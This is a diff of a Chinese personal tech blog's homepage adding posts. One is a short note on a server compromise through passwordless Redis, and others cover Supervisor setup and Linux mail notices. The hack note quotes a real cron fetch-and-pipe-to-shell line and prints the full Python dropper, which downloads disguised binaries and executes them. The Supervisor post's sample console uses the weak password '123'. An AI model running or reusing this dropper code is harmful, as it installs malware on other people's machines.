@@ -207,6 +207,287 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/Hacked-20200109.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_bear.png">
+      <meta itemprop="name" content="Mr.Zhou">
+      <meta itemprop="description" content="喜欢的编程语言是Python，喜欢做爬虫与数据相关">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SpiderBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/Hacked-20200109.html" class="post-title-link" itemprop="url">Hacked-20200109</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-09 11:00:40" itemprop="dateCreated datePublished" datetime="2020-01-09T11:00:40+08:00">2020-01-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-04 15:07:27" itemprop="dateModified" datetime="2020-02-04T15:07:27+08:00">2020-02-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hacker/" itemprop="url" rel="index">
+                    <span itemprop="name">Hacker</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">服务器上的服务挂掉了，使用远程登录也登录不上去，只能控制台强制关机</span><br><span class="line">登录之后，发现一个定时任务，如下：</span><br><span class="line">( curl -fsSL -m180 aliyun.one || wget -q -T180 -O- aliyun.one || python -c 'import urllib;exec(urllib.urlopen("http://aliyun.one/pygo").read())' ) | sh &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">看到exec就知道被入侵了(个人没有写exec的习惯)</span><br></pre></td></tr></table></figure>
+
+<h4 id="让我康康"><a href="#让我康康" class="headerlink" title="让我康康"></a>让我康康</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://aliyun.one/pygo文件内容如下：</span></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> platform.architecture()[<span class="number">0</span>] == <span class="string">"64bit"</span>:</span><br><span class="line">    urlx64 = <span class="string">'http://img.sobot.com/chatres/89/msg/20191225/1/ec0991da601e45c4b0bb6178da5f0cc4.png'</span></span><br><span class="line">    urlx642 = <span class="string">'https://user-images.githubusercontent.com/56861392/71443284-08acf200-2745-11ea-8ef3-509d9072d970.png'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = urllib.urlopen(urlx64)</span><br><span class="line">        <span class="keyword">if</span> f.code == <span class="number">200</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                code.write(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f2 = urllib.urlopen(urlx642)</span><br><span class="line">            data2 = f2.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code2:</span><br><span class="line">                code2.write(data2)</span><br><span class="line">        os.chmod(<span class="string">"/tmp/sshd"</span>, <span class="number">0o777</span>)</span><br><span class="line">        os.system(<span class="string">"/tmp/sshd"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    urlx32 = <span class="string">'http://img.sobot.com/chatres/89/msg/20191225/1/50659157a100466a88fed550423a38ee.png'</span></span><br><span class="line">    urlx322 = <span class="string">'https://user-images.githubusercontent.com/56861392/71443285-08acf200-2745-11ea-96c3-0c2be9135085.png'</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = urllib.urlopen(urlx32)</span><br><span class="line">        <span class="keyword">if</span> f.code == <span class="number">200</span>:</span><br><span class="line">            data = f.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code:</span><br><span class="line">                code.write(data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f2 = urllib.urlopen(urlx322)</span><br><span class="line">            data2 = f2.read()</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"/tmp/sshd"</span>, <span class="string">"wb"</span>) <span class="keyword">as</span> code2:</span><br><span class="line">                code2.write(data2)</span><br><span class="line">        os.chmod(<span class="string">"/tmp/sshd"</span>, <span class="number">0o777</span>)</span><br><span class="line">        os.system(<span class="string">"/tmp/sshd"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="猜测被入侵原因"><a href="#猜测被入侵原因" class="headerlink" title="猜测被入侵原因"></a>猜测被入侵原因</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis没有设置密码，被入侵也正常</span><br><span class="line">-- 以后各种数据库和中间件一定要设置密码</span><br></pre></td></tr></table></figure>
+
+<h4 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.v2ex.com&#x2F;t&#x2F;626230  # 看一下别人的讨论</span><br></pre></td></tr></table></figure>
+
+<h4 id="我的解决办法"><a href="#我的解决办法" class="headerlink" title="我的解决办法"></a>我的解决办法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">重装系统</span><br><span class="line">- 用来玩的服务器没有任何有价值的资料</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/Supervisor.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_bear.png">
+      <meta itemprop="name" content="Mr.Zhou">
+      <meta itemprop="description" content="喜欢的编程语言是Python，喜欢做爬虫与数据相关">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SpiderBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/Supervisor.html" class="post-title-link" itemprop="url">Supervisor</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-08 13:33:52" itemprop="dateCreated datePublished" datetime="2020-01-08T13:33:52+08:00">2020-01-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-04 15:03:12" itemprop="dateModified" datetime="2020-02-04T15:03:12+08:00">2020-02-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Supervisor"><a href="#Supervisor" class="headerlink" title="Supervisor"></a>Supervisor</h3><h4 id="专业名称解释"><a href="#专业名称解释" class="headerlink" title="专业名称解释"></a>专业名称解释</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">supervisor：要安装的软件的名称。</span><br><span class="line">supervisord：装好supervisor软件后，supervisord用于启动supervisor服务。</span><br><span class="line">supervisorctl：用于管理supervisor配置文件中program。</span><br></pre></td></tr></table></figure>
+
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
+<li>centos7</li>
+</ul>
+<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install -y supervisor</span><br><span class="line">systemctl enable supervisord <span class="comment"># 开机自启动</span></span><br><span class="line">systemctl start supervisord <span class="comment"># 启动supervisord服务</span></span><br><span class="line">systemctl status supervisord <span class="comment"># 查看supervisord服务状态</span></span><br><span class="line">ps -ef|grep supervisord <span class="comment"># 查看是否存在supervisord进程</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 可以看到配置文件位置</span><br><span class="line"># 主配置文件在&#x2F;etc&#x2F;supervisord.conf</span><br><span class="line"># 子配置文件放在&#x2F;etc&#x2F;supervisord.d目录里面  # 以.ini结束的配置文件</span><br></pre></td></tr></table></figure>
+
+<h4 id="配置为supervisor服务"><a href="#配置为supervisor服务" class="headerlink" title="配置为supervisor服务"></a>配置为supervisor服务</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/lib/systemd/system/supervisord.service</span><br><span class="line"><span class="comment"># 将下面一段配置信息粘贴进去(类似/usr/bin/supervisord的路径需要自己修改对应的)</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Process Monitoring <span class="keyword">and</span> Control Daemon</span><br><span class="line">After=rc-local.service nss-user-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/var/run/supervisord.pid</span><br><span class="line">ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf</span><br><span class="line">ExecStop=/usr/bin/supervisorctl shutdown</span><br><span class="line">ExecReload=/usr/bin/supervisorctl reload</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=on-failure   <span class="comment"># 非正常退出，会重启</span></span><br><span class="line">RestartSec=<span class="number">42</span>s   <span class="comment"># 重启之前等待42秒</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">启动服务</span><br><span class="line">systemctl enable supervisord</span><br><span class="line">检查是否启动成功</span><br><span class="line">systemctl <span class="keyword">is</span>-enabled supervisord  <span class="comment"># 出现enabled，则启动成功</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以使用如下命令管理supervisor服务了</span></span><br><span class="line">systemctl stop supervisord</span><br><span class="line">systemctl start supervisord</span><br><span class="line">systemctl status supervisord</span><br><span class="line">systemctl reload supervisord</span><br><span class="line">systemctl restart supervisord</span><br></pre></td></tr></table></figure>
+
+<h3 id="supervisor简单使用"><a href="#supervisor简单使用" class="headerlink" title="supervisor简单使用"></a>supervisor简单使用</h3><h4 id="开放到外网"><a href="#开放到外网" class="headerlink" title="开放到外网"></a>开放到外网</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">port=*:<span class="number">9001</span>                ;Web管理后台运行的IP和端口，如果开放到公网，需要注意安全性</span><br><span class="line">username=user              ;登录管理后台的用户名</span><br><span class="line">password=<span class="number">123</span>               ;登录管理后台的密码</span><br></pre></td></tr></table></figure>
+
+<h4 id="子进程配置"><a href="#子进程配置" class="headerlink" title="子进程配置"></a>子进程配置</h4><ul>
+<li>讲解</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#项目名</span></span><br><span class="line">[program:blog]</span><br><span class="line"><span class="comment">#脚本目录</span></span><br><span class="line">directory=/opt/bin</span><br><span class="line"><span class="comment">#脚本执行命令</span></span><br><span class="line">command=/usr/bin/python /opt/bin/test.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#supervisor启动的时候是否随着同时启动，默认True</span></span><br><span class="line">autostart=true</span><br><span class="line"><span class="comment">#当程序exit的时候，这个program不会自动重启,默认unexpected，设置子进程挂掉后自动重启的情况，有三个选项，false,unexpected和true。如果为false的时候，无论什么情况下，都不会被重新启动，如果为unexpected，只有当进程的退出码不在下面的exitcodes里面定义的</span></span><br><span class="line">autorestart=false</span><br><span class="line"><span class="comment">#这个选项是子进程启动多少秒之后，此时状态如果是running，则我们认为启动成功了。默认值为1</span></span><br><span class="line">startsecs=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本运行的用户身份 </span></span><br><span class="line">user = test</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志输出 </span></span><br><span class="line">stderr_logfile=/tmp/blog_stderr.log </span><br><span class="line">stdout_logfile=/tmp/blog_stdout.log </span><br><span class="line"><span class="comment">#把stderr重定向到stdout，默认 false</span></span><br><span class="line">redirect_stderr = true</span><br><span class="line"><span class="comment">#stdout日志文件大小，默认 50MB</span></span><br><span class="line">stdout_logfile_maxbytes = <span class="number">20</span>M</span><br><span class="line"><span class="comment">#stdout日志文件备份数</span></span><br><span class="line">stdout_logfile_backups = <span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>例子</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[program:test] </span><br><span class="line">directory=/root </span><br><span class="line">command=/usr/sbin/tinyproxy -c /etc/tinyproxy/tinyproxy.conf</span><br><span class="line">autostart=true </span><br><span class="line">autorestart=false </span><br><span class="line">stderr_logfile=/root/tmp/tinyproxy/test_stderr.log </span><br><span class="line">stdout_logfile=/root/tmp/tinyproxy/test_stdout.log </span><br><span class="line"><span class="comment">#user = test</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/Linux-nous.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_bear.png">
+      <meta itemprop="name" content="Mr.Zhou">
+      <meta itemprop="description" content="喜欢的编程语言是Python，喜欢做爬虫与数据相关">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SpiderBlog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/Linux-nous.html" class="post-title-link" itemprop="url">Linux-nous</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-01-08 12:57:28" itemprop="dateCreated datePublished" datetime="2020-01-08T12:57:28+08:00">2020-01-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-04 15:12:18" itemprop="dateModified" datetime="2020-02-04T15:12:18+08:00">2020-02-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You have new mail <span class="keyword">in</span> /var/spool/mail/root</span><br><span class="line"><span class="comment"># 这个提示是LINUX会定时查看LINUX各种状态做汇总，每经过一段时间会把汇总的信息发送的root的邮箱里，以供有需之时查看</span></span><br><span class="line"><span class="comment"># 一般这种情况mail的内容就只是一些正常的系统信息或者是比较重要的错误报告。</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><ul>
+<li>关闭提示</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;unset MAILCHECK&quot;&gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -lth &#x2F;var&#x2F;spool&#x2F;mail&#x2F;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>清空</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/OOP-Python.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -798,274 +1079,6 @@
   
   
 
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/Function-param.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_bear.png">
-      <meta itemprop="name" content="Mr.Zhou">
-      <meta itemprop="description" content="喜欢的编程语言是Python，喜欢做爬虫与数据相关">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SpiderBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Function-param.html" class="post-title-link" itemprop="url">Function-param</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-01-06 14:01:32" itemprop="dateCreated datePublished" datetime="2020-01-06T14:01:32+08:00">2020-01-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-04 15:15:31" itemprop="dateModified" datetime="2020-02-04T15:15:31+08:00">2020-02-04</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="1-位置参数"><a href="#1-位置参数" class="headerlink" title="1.位置参数"></a>1.位置参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> x*x</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-默认参数"><a href="#2-默认参数" class="headerlink" title="2.默认参数"></a>2.默认参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span><span class="params">(x=<span class="number">1</span>)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> x*x</span><br><span class="line"><span class="comment"># 必选参数在前，默认参数在后</span></span><br><span class="line"><span class="comment"># 变化大的参数在前，变化小的参数在后</span></span><br><span class="line"><span class="comment"># 变化小的参数可以作为默认参数</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="3-可变参数"><a href="#3-可变参数" class="headerlink" title="3.可变参数"></a>3.可变参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cale</span><span class="params">(*numbers)</span>:</span></span><br><span class="line">    sum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    <span class="keyword">return</span> sum</span><br><span class="line"></span><br><span class="line">cale(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
-
-<h4 id="4-关键字参数"><a href="#4-关键字参数" class="headerlink" title="4.关键字参数"></a>4.关键字参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name, age, **kw)</span></span></span><br><span class="line"><span class="function">    <span class="title">print</span><span class="params">(<span class="string">'name:'</span>,name,<span class="string">'age:'</span>,age,<span class="string">'other'</span>,kw)</span></span></span><br><span class="line"><span class="function"><span class="title">person</span><span class="params">(<span class="string">'Tom'</span>, <span class="number">30</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">person</span><span class="params">(<span class="string">'Tom'</span>, <span class="number">30</span>, city=<span class="string">'beijing'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">person</span><span class="params">(<span class="string">'Tom'</span>, <span class="number">30</span>, **dict1)</span></span></span><br></pre></td></tr></table></figure>
-
-<h4 id="5-命名关键字参数"><a href="#5-命名关键字参数" class="headerlink" title="5.命名关键字参数"></a>5.命名关键字参数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person</span><span class="params">(name,age,*,city,job)</span>:</span></span><br><span class="line">    <span class="comment"># 没有可变参数时</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">person1</span><span class="params">(name,age,*args,city=<span class="string">'beijing'</span>,job)</span>:</span></span><br><span class="line">    <span class="comment"># 有可变参数时，不再需要特殊分隔符*</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="参数组合"><a href="#参数组合" class="headerlink" title="参数组合"></a>参数组合</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">顺序：必选参数（位置参数），默认参数，可变参数，关键字参数，命名关键字参数</span><br></pre></td></tr></table></figure>
-
-<h4 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">func(*args,**kw)</span><br><span class="line">对于任意函数，都可以通过类似func(*args,**kw)的形式调用它，无论它的参数是如何定义的。</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://spiderblog.cn/Process-run-background.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_bear.png">
-      <meta itemprop="name" content="Mr.Zhou">
-      <meta itemprop="description" content="喜欢的编程语言是Python，喜欢做爬虫与数据相关">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="SpiderBlog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/Process-run-background.html" class="post-title-link" itemprop="url">Process-run-background</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-01-06 10:42:01" itemprop="dateCreated datePublished" datetime="2020-01-06T10:42:01+08:00">2020-01-06</time>
-            </span>
-              <span class="post-meta-item">
